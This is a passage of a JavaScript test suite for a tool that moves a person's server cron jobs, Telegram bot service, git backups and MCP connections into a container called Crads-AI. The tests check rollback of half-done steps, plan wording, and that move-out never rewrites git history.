  approve(d, ['cutover-script-money-state']);
  const op2 = begin(d, 'cutover-script-money-state', 'apply');
  await runHostOp(srv.host, op2);
  const rb = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'rollback', container: container(d), host: srv.host });
  assert.equal(rb.ok, true, rb.error);
  assert.equal(srv.crontab.fixture, original, 'the undo op put the line back, byte for byte');
  assert.equal(enabledRow(d), false, 'one owner again: the server');
  assert.equal(step(d, 'cutover-script-money-state').state, 'approved');
});

test('half done on the way BACK (undo): before the server op it can stay done; after it, the undo finishes', async () => {
  const d = readyCutover();
  const srv = fakeServer();
  const original = srv.crontab.fixture;
  assert.equal((await runHostStep({ id: 'cutover-script-money-state', action: 'apply', container: container(d), host: srv.host })).ok, true);
  // died before the server op: the line is still commented
  begin(d, 'cutover-script-money-state', 'undo');
  const c = await checkHostStep({ id: 'cutover-script-money-state', container: container(d), host: srv.host });
  assert.equal(c.check.server, 'changed');
  assert.deepEqual(c.check.choices.map((x) => x.label), ['Finish undoing it', 'Keep it done']);
  const keep = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'rollback', container: container(d), host: srv.host });
  assert.equal(keep.ok, true, keep.error);
  assert.equal(step(d, 'cutover-script-money-state').state, 'done');
  assert.equal(enabledRow(d), true);
  // died after the server op: the line is back; finishing the undo switches the Crads-AI copy off
  const op = begin(d, 'cutover-script-money-state', 'undo');
  assert.equal((await runHostOp(srv.host, op)).ok, true);
  assert.equal(srv.crontab.fixture, original);
  const fin = await resolveHostStep({ id: 'cutover-script-money-state', choice: 'finish', container: container(d), host: srv.host });
  assert.equal(fin.ok, true, fin.error);
  assert.equal(step(d, 'cutover-script-money-state').state, 'undone');
  assert.equal(enabledRow(d), false);
  assert.equal(srv.crontab.fixture, original);
});

test('half done on the Telegram service: after the server op, finish lets Crads-AI answer and remembers the service was on', async () => {
  const d = fresh();
  const srv = fakeServer();
  approve(d, ['telegram-carry', 'telegram-cutover']);
  applyStep(d, 'telegram-carry');
  finished(d);
  const op = begin(d, 'telegram-cutover', 'apply');
  await runHostOp(srv.host, op);   // the service is off; the Crads-AI half (after) never ran
  assert.ok(existsSync(path.join(d, '.kernel', 'telegram-reader')), 'nobody answers the bot right now: the marker still says host');
  const c = await checkHostStep({ id: 'telegram-cutover', container: container(d), host: srv.host });
  assert.equal(c.check.server, 'changed');
  const fin = await resolveHostStep({ id: 'telegram-cutover', choice: 'finish', container: container(d), host: srv.host });
  assert.equal(fin.ok, true, fin.error);
  assert.ok(!existsSync(path.join(d, '.kernel', 'telegram-reader')));
  assert.equal(plan(d).telegram.answered_by, 'crads');
  const s = step(d, 'telegram-cutover');
  assert.deepEqual(s.result.prior, { enabled: 'enabled', active: 'active' }, 'from the inventory, said so in a warning');
  assert.match(s.result.warning, /lost what the service was doing/);
  assert.equal((await runHostStep({ id: 'telegram-cutover', action: 'undo', container: container(d), host: srv.host })).ok, true);
  assert.deepEqual(srv.units['telegram-chat.service'], { enabled: 'enabled', active: 'active' });
});

test('half done but the server shows neither state: nothing is offered and nothing is run', async () => {
  const d = readyCutover();
  const srv = fakeServer();
  begin(d, 'cutover-script-money-state', 'apply');
  srv.crontab.fixture = srv.crontab.fixture.split('\n').filter((l) => !l.includes('money-state')).join('\n');   // edited by hand
  const c = await checkHostStep({ id: 'cutover-script-money-state', container: container(d), host: srv.host });
  assert.equal(c.check.server, 'unclear');
  assert.deepEqual(c.check.choices, []);
  for (const choice of ['finish', 'rollback']) {
    const r = await resolveHostStep({ id: 'cutover-script-money-state', choice, container: container(d), host: srv.host });
    assert.equal(r.ok, false);
    assert.match(r.error, /changed it by hand/);
  }
  assert.equal(writes(srv), 0);
  assert.equal(step(d, 'cutover-script-money-state').in_flight, 'apply', 'still waiting, honestly');
  // and the box can never hand back a change where a check was asked for
  const evil = async (args, stdin) => (args[0] === 'host-check' ? { code: 0, stdout: 'HOST_OP {"op":"cron-comment","action":"apply","user":"fixture","line_text":"x","ymd":"2026-10-18"}\n' } : container(d)(args, stdin));
  const e = await checkHostStep({ id: 'cutover-script-money-state', container: evil, host: srv.host });
  assert.equal(e.ok, false);
  assert.equal(writes(srv), 0);
});

// ---- adopt rehearsal T4 fixes (2026-10-18) ---------------------------------------------------

test('T4 finding 4: a Claude job whose prompt is built when it runs becomes a Scripts row running the person\'s own runner, never a placeholder skill', () => {
  const d = fresh();
  const p = plan(d);
  const by = (id) => p.steps.find((s) => s.id === id);
  for (const id of ['weekly', 'evening-check']) {
    const add = by(`script-${id}`);
    assert.ok(add, `${id} is a Scripts row`);
    assert.deepEqual(add.job.entry.argv, ['node', path.join(d, 'cockpit/run-job.mjs'), id], 'the same argv the crontab ran, mapped onto /state');
    assert.equal(add.job.entry.cwd, d, 'from the folder cron ran it in');
    assert.equal(add.job.runs_claude, true);
    assert.ok(add.job.entry.timeout_s >= 1800, 'a Claude run gets minutes, not the plain-script limit');
    assert.match(add.why, /job runner builds/);
    assert.match(add.why, /calls claude itself, which is installed inside your mineral/);
    assert.ok(!p.steps.some((s) => s.id === `cadence-${id}` || s.id === `cadence-${id}-2`), `${id} is not made into a skill`);
  }
  assert.match(by('script-weekly').why, /also has a \/weekly skill/, 'the same-named skill is mentioned');
  assert.doesNotMatch(by('script-evening-check').why, /also has a/);
  // a prompt the shell puts together is carried as the same command too
  const st = by('script-standup');
  assert.equal(st.job.entry.argv[0], 'bash');
  assert.match(st.job.entry.argv[2], /claude -p "\$\(cat prompts\/standup\.txt\)"/);
  assert.match(st.why, /shell puts together/);
  // no skill anywhere says "find the words elsewhere"
  for (const s of p.steps) {
    const text = (s.job && s.job.skill && s.job.skill.text) || '';
    assert.doesNotMatch(text, /could not copy|the way your server's job runner does|Ask your assistant to write this skill/, s.id);
  }
  // a plain-string prompt from the runner still becomes a skill, word for word
  assert.match(by('cadence-email-watcher').job.skill.text, /word for word:\n\nCheck the inbox for anything urgent/);
  // the runner's prompt as a method is read as a prompt, not as "runs a program"
  assert.equal(readJobDefinition("export const JOBS = { lint: { async prompt(ctx) { return 'x'; } } };", 'jobs.mjs', 'lint').claude, true);
});

test('T4 finding 10: every step reason is whole sentences, none starts in lower case, none repeats', () => {
  assert.equal(sentences('it ran', 'It ran.', '', null, false, 0, 'the end'), 'It ran. The end.');
  const p = plan(fresh());
  for (const s of p.steps) {
    for (const k of ['what', 'why']) {
      const t = s[k] || '';
      if (!t) continue;
      assert.match(t, /^[A-Z0-9"]/, `${s.id}.${k} starts with a capital: ${t.slice(0, 60)}`);
      assert.doesNotMatch(t, /\. [a-z]/, `${s.id}.${k} has a sentence in lower case: ${t}`);
      assert.doesNotMatch(t, /[.;]\./, `${s.id}.${k}`);
      const parts = t.split(/(?<=\.) /).map((x) => x.toLowerCase());
      assert.equal(new Set(parts).size, parts.length, `${s.id}.${k} repeats itself: ${t}`);
      assert.doesNotMatch(t, /\u2014/);
    }
  }
  const fin = runCli([fresh(), 'finish']);
  assert.doesNotMatch(fin.stdout, /next start/);
});

test('T4 finding 5: Telegram\'s switch-over opens only after Finish, never counts toward it, and the page line says who reads the bot', async () => {
  const d = fresh();
  const srv = fakeServer();
  const cut = step(d, 'telegram-cutover');
  assert.equal(cut.after_finish, true);
  assert.match(cut.why, /available once you finish moving in/);
  // before anything: the host program answers, Crads-AI has nothing
  assert.match(show(d).telegram_now.words, /your own program on the server answers your bot\. Crads-AI does not have/);
  approve(d, ['telegram-carry', 'telegram-cutover']);
  applyStep(d, 'telegram-carry');
  assert.match(show(d).telegram_now.words, /sends nothing while you are moving in/, 'during move-in nothing is sent');
  // while moving in it is refused before the server is touched
  const r = await runHostStep({ id: 'telegram-cutover', action: 'apply', container: container(d), host: srv.host });
  assert.equal(r.ok, false);
  assert.match(r.error, /after you finish moving in/);
  assert.equal(srv.calls.length, 0);
  assert.deepEqual(srv.units['telegram-chat.service'], { enabled: 'enabled', active: 'active' });
  // it does not hold Finish back
  for (const s of plan(d).steps) if (s.state !== 'done' && s.id !== 'telegram-cutover') runCli([d, 'skip', s.id]);
  assert.equal(settled(plan(d)), true);
  const f = runCli([d, 'finish']);
  assert.equal(f.code, 0, f.stdout);
  assert.match(f.stdout, /from the next minute/);
  assert.match(f.stdout, /Letting Crads-AI answer your Telegram bot is now a step/);
  assert.match(show(d).telegram_now.words, /reads nothing, and sends you the results of jobs set to "Send me the result"/, 'after Finish: sending, while the program answers');
  // after Finish it works, and the line follows the truth
  const ok = await runHostStep({ id: 'telegram-cutover', action: 'apply', container: container(d), host: srv.host });
  assert.equal(ok.ok, true, ok.error);
  assert.equal(show(d).telegram_now.who, 'crads');
  // a plan from before this fix, cut over during move-in, says nobody answers
  const legacy = { telegram: { env_file: 'vps/.env', carried: true, answered_by: 'crads' }, steps: [{ id: 'telegram-cutover', state: 'done' }] };
  assert.equal(telegramNow(legacy, { movingIn: true }).who, 'nobody');
  assert.match(telegramNow(legacy, { movingIn: true }).words, /nobody answers your bot right now/);
});

test('T4 finding 1: Move out holds every committer first, lists Crads-AI\'s commits since the move-in began, and rewrites nothing', async () => {
  const d = fresh();
  const git = (args, env = {}) => execFileSync('git', ['-c', `safe.directory=${d}`, '-C', d, ...args], { encoding: 'utf8', env: { ...process.env, ...env } }).trim();
  const at = (iso) => ({ GIT_AUTHOR_DATE: iso, GIT_COMMITTER_DATE: iso });
  git(['init', '-q', '-b', 'master']);
  git(['-c', 'user.name=Fixture Person', '-c', 'user.email=me@example.com', 'commit', '-q', '--allow-empty', '-m', 'my own work'], at('2026-10-01T10:00:00Z'));
  git(['-c', 'user.name=box', '-c', 'user.email=box@local', 'commit', '-q', '--allow-empty', '-m', 'sync: nightly backup 2026-10-02'], at('2026-10-02T10:00:00Z'));
  git(['-c', 'user.name=box', '-c', 'user.email=box@local', 'commit', '-q', '--allow-empty', '-m', 'sync: nightly backup 2026-10-18'], at('2026-10-18T12:00:00Z'));
  git(['-c', 'user.name=AI OS kernel', '-c', 'user.email=kernel@ai-os.local', 'commit', '-q', '--allow-empty', '-m', 'kernel: session'], at('2026-10-18T13:00:00Z'));
  git(['-c', 'user.name=Fixture Person', '-c', 'user.email=me@example.com', 'commit', '-q', '--allow-empty', '-m', 'more of my work'], at('2026-10-18T14:00:00Z'));
  const head = git(['rev-parse', 'HEAD']);
  // Finished: the flag is off, which is when box-up's exit trap would commit
  for (const s of plan(d).steps) if (s.state !== 'done') runCli([d, 'skip', s.id]);
  assert.equal(runCli([d, 'finish']).code, 0);
  assert.equal(own(d).moving_in, false);
  // the order the box sees: the hold, before any reversal or teardown
  const seen = [];
  const c = container(d);
  let flagsAtTeardown = null;
  const r = await moveOut({ container: async (args, stdin) => { seen.push(args[0]); return c(args, stdin); }, host: fakeServer().host,
    brainRoot: '/home/fixture/brain', teardown: async () => { flagsAtTeardown = own(d); return { ok: true, kept: ['marked your folder as adopted'] }; } });
  assert.equal(r.ok, true, r.error);
  assert.equal(seen[0], 'move-out-begin');
  assert.deepEqual({ moving_in: flagsAtTeardown.moving_in, moving_out: flagsAtTeardown.moving_out }, { moving_in: true, moving_out: true },
    'when the container is stopped, every moving_in gate (commit-on-exit, brain-push, kernel, scheduler, comms) holds');
  assert.equal(flagsAtTeardown.adopted, true, 'other keys kept');
  assert.deepEqual(r.commits.map((x) => x.subject), ['kernel: session', 'sync: nightly backup 2026-10-18'], 'only Crads-AI\'s, only since the move-in began');
  for (const x of r.commits) assert.match(x.sha, /^[0-9a-f]{40}$/);
  assert.equal(git(['rev-parse', 'HEAD']), head, 'history is never rewritten, and nothing new was committed');
  // and the words the page shows
  const { moveOutWords } = await import('../../wizard/panel/move-in-host.mjs');
  const w = moveOutWords(r);
  assert.match(w, /cockpit\/move-in\.json/);
  assert.match(w, /move-in\.md/);
  assert.match(w, /stay in your git history; nothing was rewritten/);
  assert.ok(w.includes(r.commits[0].short) && w.includes('kernel: session'));
  assert.doesNotMatch(w, /\u2014/);
  // a box that cannot hold first is never reversed or torn down
  const d2 = fresh();
  approve(d2, ['gitignore']); applyStep(d2, 'gitignore');
  let torn = false;
  const old = async (args, stdin) => (args[0] === 'move-out-begin' ? { code: 2, stdout: 'usage: apply.mjs ...\n' } : container(d2)(args, stdin));
  const r2 = await moveOut({ container: old, host: fakeServer().host, brainRoot: '/home/fixture/brain', teardown: async () => { torn = true; } });
  assert.equal(r2.ok, false);
  assert.match(r2.error, /nothing was changed/);
  assert.equal(step(d2, 'gitignore').state, 'done');
  assert.equal(torn, false);
});

test('T4 finding 8: a remote only the server can use holds the backup switch-over until GitHub is connected', async () => {
  // the shapes
  assert.equal(remoteReach('git@github-brain:me/brain.git').kind, 'alias');
  assert.equal(remoteReach('ssh://git@github-brain/me/brain.git').usable, false);
  assert.equal(remoteReach('/srv/git/brain.git').kind, 'path');
  assert.equal(remoteReach('../brain.git').usable, false);
  assert.equal(remoteReach('git@github.com:me/brain.git').usable, true);
  assert.equal(remoteReach('https://github.com/me/brain.git').usable, true);
  assert.equal(remoteReach('').usable, null);
  assert.equal(mineralRewrite('git@github-brain:me/brain.git', '[url "https://github.com/"]\n\tinsteadOf = git@github.com:\n[url "https://github.com/me/brain.git"]\n\tinsteadOf = git@github-brain:me/brain.git\n'), 'https://github.com/me/brain.git');
  assert.equal(mineralRewrite('git@github-brain:me/other.git', '[url "https://github.com/me/brain.git"]\n\tinsteadOf = git@github-brain:me/brain.git\n'), '', 'a route is for its own repository only');
  assert.equal(mineralRewrite('x', null), '');
  assert.equal(parseGitRemoteUrl('[core]\n\tbare = false\n[remote "origin"]\n\turl = git@github-brain:me/brain.git\n\tfetch = +refs/heads/*:refs/remotes/origin/*\n', 'origin'), 'git@github-brain:me/brain.git');
  // the plan, with the inventory naming the remote and .git/config holding an alias
  const d = makeBrain(tmpDir('mi-remote-'));
  const inv = readInventory(d);
  inv.git = { branch: 'master', remote: 'origin', dirty: 0 };
  writeFileSync(path.join(d, '.kernel/move-in/host-inventory.json'), JSON.stringify(inv));
  mkdirSync(path.join(d, '.git'), { recursive: true });
  writeFileSync(path.join(d, '.git', 'config'), '[remote "origin"]\n\turl = git@github-brain:fixture/brain.git\n');
  assert.ok(planNow(d, { has, now: NOW }).ok);
  const note = step(d, 'note-git-remote');
  assert.ok(note, 'a clear step says so');
  assert.match(note.title, /Connect GitHub/);
  assert.match(note.what, /github-brain/);
  assert.match(note.what, /your own backup job keeps running on the server/);
  const cut = step(d, 'cutover-script-backup');
  assert.match(cut.hold, /Connect GitHub first/);
  assert.equal(step(d, 'cutover-script-money-state').hold, undefined, 'only the backup waits');
  // the switch-over is refused before the server is touched
  approve(d, ['script-backup', 'cutover-script-backup']); applyStep(d, 'script-backup'); ranOk(d, 'scripts', 'backup');
  const srv = fakeServer();
  const r = await runHostStep({ id: 'cutover-script-backup', action: 'apply', container: container(d), host: srv.host });
  assert.equal(r.ok, false);
  assert.match(r.error, /Connect GitHub first/);
  assert.equal(srv.calls.length, 0);
  // Connect GitHub (trap 77) gives the MINERAL its own route and leaves the shared
  // .git/config holding the alias: the plan made again sees the route and lets it through.
  mkdirSync(path.join(d, '.kernel', 'home'), { recursive: true });
  writeFileSync(path.join(d, '.kernel', 'home', '.gitconfig'), '[url "https://github.com/fixture/brain.git"]\n\tinsteadOf = git@github-brain:fixture/brain.git\n');
  assert.ok(planNow(d, { has, now: NOW }).ok);
  assert.equal(readFileSync(path.join(d, '.git', 'config'), 'utf8'), '[remote "origin"]\n\turl = git@github-brain:fixture/brain.git\n', 'the server\'s remote is still its alias');
  assert.equal(step(d, 'note-git-remote'), undefined, 'connected through the mineral\'s own route');
  assert.equal(step(d, 'cutover-script-backup').hold, undefined);
  assert.match(step(d, 'note-git').what, /over HTTPS \(https:\/\/github\.com\/fixture\/brain\.git\)/);
  // and a remote the mineral can reach as it is needs no route at all
  rmSync(path.join(d, '.kernel', 'home', '.gitconfig'));
  writeFileSync(path.join(d, '.git', 'config'), '[remote "origin"]\n\turl = https://github.com/fixture/brain.git\n');
  assert.ok(planNow(d, { has, now: NOW }).ok);
  assert.equal(step(d, 'note-git-remote'), undefined);
  assert.equal(step(d, 'cutover-script-backup').hold, undefined);
  const ok = await runHostStep({ id: 'cutover-script-backup', action: 'apply', container: container(d), host: srv.host });
  assert.equal(ok.ok, true, ok.error);
});

test('T4 finding 7: show carries the last run of every job a cutover switches over, so the page can wait for a long run', () => {
  const d = fresh();
  ranOk(d, 'scripts', 'money-state');
  ranOk(d, 'cadence', 'morning');
  const lr = show(d).last_runs;
  assert.equal(lr['scripts:money-state'].status, 'ok');
  assert.equal(lr['cadence:morning'].status, 'ok');
  assert.ok(lr['scripts:money-state'].ts);
});

// Shadow test on Oracle (2026-10-19): three connection verdicts were too kind.
test('connections: loopback is the server, outside paths are the server, missing tokens are named', async () => {
  const { mcpPlace, loopbackOf } = await import('./lib.mjs');
  const env = { has: (b) => ['node', 'npx', 'python3'].includes(b), inBrain: (p) => (p.startsWith('/home/pat/brain/') ? '/state/' + p.slice(16) : null), exists: () => true };
  assert.equal(loopbackOf('http://localhost:8000/mcp'), 'localhost:8000');
  assert.equal(loopbackOf('http://127.0.0.1:9/x'), '127.0.0.1:9');
  assert.equal(loopbackOf('https://mcp.stripe.com'), null);
  const gws = mcpPlace({ type: 'http', url: 'http://localhost:8000/mcp' }, env);
  assert.equal(gws.place, 'host', 'a server on the machine itself is not reachable from inside the mineral');
  assert.match(gws.why, /localhost:8000/);
  assert.equal(mcpPlace({ type: 'http', url: 'https://mcp.stripe.com' }, env).place, 'container');
  const wa = mcpPlace({ command: 'uv', args: ['--directory', '/home/pat/second-brain/whatsapp-mcp/server', 'run', 'main.py'] }, env);
  assert.equal(wa.place, 'host', 'a folder outside the brain is invisible to the mineral');
  assert.match(wa.why, /outside your brain folder/);
  assert.equal(mcpPlace({ command: 'node', args: ['/home/pat/brain/tools/x.mjs'] }, env).place, 'container', 'a path inside the brain is fine');
});

test('connections: a ${VAR} the mineral does not have reads as "needs a setting", not "runs"', () => {
  const d = fresh();
  writeFileSync(path.join(d, '.mcp.json'), JSON.stringify({ mcpServers: { todoist: { type: 'http', url: 'https://ai.todoist.net/mcp', headers: { Authorization: 'Bearer ${CRADS_TEST_SURELY_UNSET_TOKEN}' } } } }));
  const inv = JSON.parse(readFileSync(path.join(d, '.kernel', 'move-in', 'host-inventory.json'), 'utf8'));
  inv.mcp_servers = ['todoist'];
  writeFileSync(path.join(d, '.kernel', 'move-in', 'host-inventory.json'), JSON.stringify(inv));
  assert.ok(planNow(d, { has, now: NOW }).ok);
  const p = plan(d);
  const note = p.steps.find((s) => s.id === 'note-mcp');
  const t = note.details.find((x) => x.name === 'todoist');
  assert.equal(t.place, 'settings');
  assert.match(t.words, /needs a setting added to your mineral first/);
  assert.match(t.words, /CRADS_TEST_SURELY_UNSET_TOKEN/);
  assert.doesNotMatch(t.words, /\u2014/);
});

test('connections: a server that needs something added AND a missing token says both, never "which your mineral has"', () => {
  const d = fresh();
  writeFileSync(path.join(d, '.mcp.json'), JSON.stringify({ mcpServers: { perplexity: { command: 'uvx', args: ['perplexity-mcp'], env: { PERPLEXITY_API_KEY: '${CRADS_TEST_SURELY_UNSET_KEY}' } } } }));
  const inv = JSON.parse(readFileSync(path.join(d, '.kernel', 'move-in', 'host-inventory.json'), 'utf8'));
  inv.mcp_servers = ['perplexity'];
  writeFileSync(path.join(d, '.kernel', 'move-in', 'host-inventory.json'), JSON.stringify(inv));
  assert.ok(planNow(d, { has, now: NOW }).ok);
  const t = plan(d).steps.find((s) => s.id === 'note-mcp').details.find((x) => x.name === 'perplexity');
  assert.match(t.words, /also needs CRADS_TEST_SURELY_UNSET_KEY, which your mineral does not have yet/);
  assert.doesNotMatch(t.words, /which your mineral has/);
});
